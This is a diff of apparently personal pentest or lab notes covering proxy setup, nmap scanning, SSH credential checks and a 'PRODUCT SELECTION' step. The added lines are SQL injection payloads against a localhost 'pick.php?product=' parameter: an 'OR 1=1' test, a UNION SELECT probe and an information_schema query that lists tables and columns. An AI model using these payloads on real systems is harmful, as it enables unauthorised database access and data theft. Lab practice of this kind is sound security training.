@@ -95,5 +95,10 @@ setup proxychains and scan next tgt using script (i can redirect nmap 2>/dev/nul
 check if ssh creds work
 -------------------
 PRODUCT SELECTION
-
 look for tables and colmuns
+test product=1 OR 1=1; #
+for all of them
+http://localhost:11900/pick.php?product=7%20OR%201=1;%20#
+THEN
+product=7 UNION SELECT 1,2,3;#
+Uproduct=7 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
